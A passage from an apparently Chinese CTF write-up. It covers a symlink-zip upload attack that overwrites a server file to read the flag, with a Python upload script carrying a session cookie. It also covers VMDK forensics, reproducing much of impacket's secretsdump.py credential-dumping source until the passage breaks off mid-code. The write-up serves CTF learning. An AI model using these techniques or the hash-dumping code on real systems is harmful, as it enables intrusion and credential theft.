js"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/user`</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>      <span class="hljs-attr">username</span>:<span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">token</span>:<span class="hljs-string">&quot;&quot;</span><br>    &#125;)<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> memory = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    memory.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`</span><br><span class="hljs-string">      &lt;p class=&quot;memory&quot;&gt;<span class="hljs-subst">$&#123;data.data.Memory&#125;</span>&lt;/p&gt;  </span><br><span class="hljs-string">    `</span>;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">data</span>);<br>    section.<span class="hljs-title function_">appendChild</span>(memory);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">alert</span>(data.<span class="hljs-property">message</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error&quot;</span> + error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>发现传回了数据库第一条即Admin的数据</p><p><img src="/posts/7bf98902/image-20240221220423762.png" alt="image-20240221220423762"></p><p><img src="/posts/7bf98902/image-20240221220947975.png" alt="image-20240221220947975"></p><p>遂登录</p><p>剩下 &#x2F;file.go 猜测 软连接unzip</p><p>猜测思路是：上传 指向&#x2F;app的软连接压缩包zip，解压之后 &#x2F;tmp 会存在一个指向 &#x2F;app 的软链接，并再上传一个文件目录为 &#x2F;app&#x2F;secret 的压缩包zip，解压刚好覆盖原有 &#x2F;app&#x2F;secret，secret内容应该为 <code>/flag</code> </p><p><img src="/posts/7bf98902/image-20240221221608392.png" alt="image-20240221221608392"></p><p>刚好对的上</p><p><img src="/posts/7bf98902/image-20240221222347176.png" alt="image-20240221222347176"></p><p>有个坑，不同浏览器对ZIP文件的MIME类型表示似乎不一样，所以我们这里使用 python 来发包</p><p>拿gpt生成一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_zip_file</span>(<span class="hljs-params">file_path, upload_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>                <span class="hljs-comment"># 设置会话的 Cookie</span><br>                session.cookies[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-string">&quot;MTcwODUwMjEzMXxEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQlVGa2JXbHV8QuJIV_GooHukGQmAE_56U-m2NWw2wOWc5t5vxqcsxys=&quot;</span>  <span class="hljs-comment"># 替换为自己的 session</span><br>                <span class="hljs-comment"># 发送 POST 请求</span><br>                files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;file.zip&#x27;</span>, file, <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br>                response = session.post(upload_url, files=files)<br>                <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;File uploaded successfully.&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server response:&quot;</span>, response.text)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to upload file. Status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error message:&quot;</span>, response.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    file_path = <span class="hljs-string">&#x27;app2.zip&#x27;</span>  <span class="hljs-comment"># 替换为要上传的 ZIP 文件的路径</span><br>    upload_url = <span class="hljs-string">&#x27;http://139.224.232.162:30639/api/upload&#x27;</span>  <span class="hljs-comment"># 替换为接收上传的服务器端 URL</span><br>    upload_zip_file(file_path, upload_url)<br><br></code></pre></td></tr></table></figure><p>把前面的 app.zip 上传并解压<img src="/posts/7bf98902/image-20240221222804290.png" alt="image-20240221222804290"></p><p>secret 写入 <code>/flag</code></p><p>压缩<img src="/posts/7bf98902/image-20240221222918273.png" alt="image-20240221222918273"></p><p>同样上传解压，访问 &#x2F;api&#x2F;secret 得到 flag</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单的vmdk取证"><a href="#简单的vmdk取证" class="headerlink" title="简单的vmdk取证"></a>简单的vmdk取证</h2><p>用 DiskGenius 打开虚拟磁盘导出</p><blockquote><ul><li>\WINDOWS\system32\config\SECURITY</li><li>\WINDOWS\system32\config\system</li><li>\WINDOWS\system32\config\SAM</li></ul></blockquote><p>使用脚本</p><details>    <summary>secret.py</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This software is provided under a slightly modified version</span><br><span class="hljs-comment"># of the Apache Software License. See the accompanying LICENSE file</span><br><span class="hljs-comment"># for more information.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Description: Performs various techniques to dump hashes from the</span><br><span class="hljs-comment">#              remote machine without executing any agent there.</span><br><span class="hljs-comment">#              For SAM and LSA Secrets (including cached creds)</span><br><span class="hljs-comment">#              we try to read as much as we can from the registry</span><br><span class="hljs-comment">#              and then we save the hives in the target system</span><br><span class="hljs-comment">#              (%SYSTEMROOT%\\Temp dir) and read the rest of the</span><br><span class="hljs-comment">#              data from there.</span><br><span class="hljs-comment">#              For NTDS.dit we either:</span><br><span class="hljs-comment">#                a. Get the domain users list and get its hashes</span><br><span class="hljs-comment">#                   and Kerberos keys using [MS-DRDS] DRSGetNCChanges()</span><br><span class="hljs-comment">#                   call, replicating just the attributes we need.</span><br><span class="hljs-comment">#                b. Extract NTDS.dit via vssadmin executed  with the</span><br><span class="hljs-comment">#                   smbexec approach.</span><br><span class="hljs-comment">#                   It&#x27;s copied on the temp dir and parsed remotely.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#              The script initiates the services required for its working</span><br><span class="hljs-comment">#              if they are not available (e.g. Remote Registry, even if it is</span><br><span class="hljs-comment">#              disabled). After the work is done, things are restored to the</span><br><span class="hljs-comment">#              original state.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author:</span><br><span class="hljs-comment">#  Alberto Solino (@agsolino)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># References: Most of the work done by these guys. I just put all</span><br><span class="hljs-comment">#             the pieces together, plus some extra magic.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># https://github.com/gentilkiwi/kekeo/tree/master/dcsync</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html</span><br><span class="hljs-comment"># https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html</span><br><span class="hljs-comment"># https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13</span><br><span class="hljs-comment"># https://code.google.com/p/creddump/</span><br><span class="hljs-comment"># https://lab.mediaservice.net/code/cachedump.rb</span><br><span class="hljs-comment"># https://insecurety.net/?p=768</span><br><span class="hljs-comment"># http://www.beginningtoseethelight.org/ntsecurity/index.htm</span><br><span class="hljs-comment"># https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&amp;-forensic-analysis.pdf</span><br><span class="hljs-comment"># https://www.passcape.com/index.php?section=blog&amp;cmd=details&amp;id=15</span><br><span class="hljs-comment">#</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> division<br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">from</span> impacket <span class="hljs-keyword">import</span> version<br><span class="hljs-keyword">from</span> impacket.examples <span class="hljs-keyword">import</span> logger<br><span class="hljs-keyword">from</span> impacket.examples.utils <span class="hljs-keyword">import</span> parse_target<br><span class="hljs-keyword">from</span> impacket.smbconnection <span class="hljs-keyword">import</span> SMBConnection<br><br><span class="hljs-keyword">from</span> impacket.examples.secretsdump <span class="hljs-keyword">import</span> (<br>    LocalOperations,<br>    RemoteOperations,<br>    SAMHashes,<br>    LSASecrets,<br>    NTDSHashes,<br>)<br><span class="hljs-keyword">from</span> impacket.krb5.keytab <span class="hljs-keyword">import</span> Keytab<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">input</span> = raw_input<br><span class="hljs-keyword">except</span> NameError:<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DumpSecrets</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, remoteName, username=<span class="hljs-string">&quot;&quot;</span>, password=<span class="hljs-string">&quot;&quot;</span>, domain=<span class="hljs-string">&quot;&quot;</span>, options=<span class="hljs-literal">None</span></span>):<br>        self.__useVSSMethod = options.use_vss<br>        self.__remoteName = remoteName<br>        self.__remoteHost = options.target_ip<br>        self.__username = username<br>        self.__password = password<br>        self.__domain = domain<br>        self.__lmhash = <span class="hljs-string">&quot;&quot;</span><br>        self.__nthash = <span class="hljs-string">&quot;&quot;</span><br>        self.__aesKey = options.aesKey<br>        self.__smbConnection = <span class="hljs-literal">None</span><br>        self.__remoteOps = <span class="hljs-literal">None</span><br>        self.__SAMHashes = <span class="hljs-literal">None</span><br>        self.__NTDSHashes = <span class="hljs-literal">None</span><br>        self.__LSASecrets = <span class="hljs-literal">None</span><br>        self.__systemHive = options.system<br>        self.__bootkey = options.bootkey<br>        self.__securityHive = options.security<br>        self.__samHive = options.sam<br>        self.__ntdsFile = options.ntds<br>        self.__history = options.history<br>        self.__noLMHash = <span class="hljs-literal">True</span><br>        self.__isRemote = <span class="hljs-literal">True</span><br>        self.__outputFileName = options.outputfile<br>        self.__doKerberos = options.k<br>        self.__justDC = options.just_dc<br>        self.__justDCNTLM = options.just_dc_ntlm<br>        self.__justUser = options.just_dc_user<br>        self.__pwdLastSet = options.pwd_last_set<br>        self.__printUserStatus = options.user_status<br>        self.__resumeFileName = options.resumefile<br>        self.__canProcessSAMLSA = <span class="hljs-literal">True</span><br>        self.__kdcHost = options.dc_ip<br>        self.__options = options<br><br>        <span class="hljs-keyword">if</span> options.hashes <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self.__lmhash, self.__nthash = options.hashes.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">self</span>):<br>        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)<br>        <span class="hljs-keyword">if</span> self.__doKerberos:<br>            self.__smbConnection.kerberosLogin(<br>                self.__username,<br>                self.__password,<br>                self.__domain,<br>                self.__lmhash,<br>                self.__nthash,<br>                self.__aesKey,<br>                self.__kdcHost,<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            self.__smbConnection.login(<br>                self.__username,<br>                self.__password,<br>                self.__domain,<br>                self.__lmhash,<br>                self.__nthash,<br>            )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.__remoteName.upper() == <span class="hljs-string">&quot;LOCAL&quot;</span> <span class="hljs-keyword">and</span> self.__username == <span class="hljs-string">&quot;&quot;</span>:<br>                self.__isRemote = <span class="hljs-literal">False</span><br>                self.__useVSSMethod = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">if</span> self.__systemHive:<br>                    localOperations = LocalOperations(self.__systemHive)<br>                    bootKey = localOperations.getBootKey()<br>                    <span class="hljs-keyword">if</span> self.__ntdsFile <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                        <span class="hljs-comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span><br>                        self.__noLMHash = localOperations.checkNoLMHashPolicy()<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">import</span> binascii<br><br>                    bootKey = binascii.unhexlify(self.__bootkey)<br><br>            <span class="hljs-keyword">else</span>:<br>                self.__isRemote = <span class="hljs-literal">True</span><br>                bootKey = <span class="hljs-literal">None</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">try</span>:<br>                        self.connect()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-keyword">if</span> (<br>                            os.getenv(<span class="hljs-string">&quot;KRB5CCNAME&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>                            <span class="hljs-keyword">and</span> self.__doKerberos <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                        ):<br>                            <span class="hljs-comment"># SMBConnection failed. That might be because there was no way to log into the</span><br>                            <span class="hljs-comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span><br>                            <span class="hljs-comment"># will work</span><br>                            logging.debug(<br>                                <span class="hljs-string">&quot;SMBConnection didn&#x27;t work, hoping Kerberos will help (%s)&quot;</span><br>                                % <span class="hljs-built_in">str</span>(e)<br>                            )<br>                            <span class="hljs-keyword">pass</span><br>                        <span class="hljs-keyword">else</span>:<br>                            <span class="hljs-keyword">raise</span><br><br>                    self.__remoteOps = RemoteOperations(<br>                        self.__smbConnection, self.__doKerberos, self.__kdcHost<br>                    )<br>                    self.__remoteOps.setExecMethod(self.__options.exec_method)<br>                    <span class="hljs-keyword">if</span> (<br>                        self.__justDC <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                        <span class="hljs-keyword">and</span> self.__justDCNTLM <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span><br>                        <span class="hljs-keyword">or</span> self.__useVSSMethod <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                    ):<br>                        self.__remoteOps.enableRegistry()<br>                        bootKey = self.__remoteOps.getBootKey()<br>                        <span class="hljs-comment"># Let&#x27;s check whether target system stores LM Hashes</span><br>                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    self.__canProcessSAMLSA = <span class="hljs-literal">False</span><br>                    <span class="hljs-keyword">if</span> (<br>                        <span class="hljs-built_in">str</span>(e).find(<span class="hljs-string">&quot;STATUS_USER_SESSION_DELETED&quot;</span>)<br>                        <span class="hljs-keyword">and</span> os.getenv(<span class="hljs-string">&quot;KRB5CCNAME&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>                        <span class="hljs-keyword">and</span> self.__doKerberos <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span><br>                    ):<br>                        <span class="hljs-comment"># Giving some hints 